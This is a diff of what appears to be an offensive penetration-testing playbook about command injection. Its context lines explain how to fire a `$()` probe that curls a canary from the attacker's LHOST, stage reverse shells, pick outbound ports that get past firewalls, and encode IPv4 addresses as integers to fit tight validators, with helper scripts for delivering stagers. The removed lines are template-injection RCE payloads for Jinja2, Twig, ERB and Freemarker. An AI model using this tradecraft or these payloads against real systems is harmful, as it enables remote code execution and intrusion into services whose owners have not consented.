@@ -117,20 +117,7 @@ curl -X POST http://target:8080/functionRouter \
 
 **Canary egress BEFORE any callback-dependent payload.** Before staging a revshell/stager, fire one `$()` probe that fetches a known file from your LHOST through the same sink (`curl -sm2 LHOST/canary`) and confirm the hit server-side. Multi-homed attack seats have several addresses - the target can usually route to only ONE (wrong-iface payloads hang the app and can wedge a single-threaded service for minutes). The canary also proves which egress ports survive the target's outbound firewall; serve your stager on an allowed port, and shorten payloads to fit tight validators by encoding IPv4 as an integer (see [[websocket-attacks]] client-hint section). Delivery helper: `bash scripts/stager.sh <lhost> [port] <payload>` (serves it + prints the int-IP one-liner); managed listener: `bash scripts/vm-handler.sh <lhost>`.
 
-## Template Injection RCE Payloads
-```python
-# Jinja2
-{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
-
-# Twig (PHP)
-{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
-
-# ERB (Ruby)
-<%= `id` %>
-
-# Freemarker
-<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}
-```
+Payload tables: see `references/ssti-rce-payloads.md`
 
 ## Evasion
 
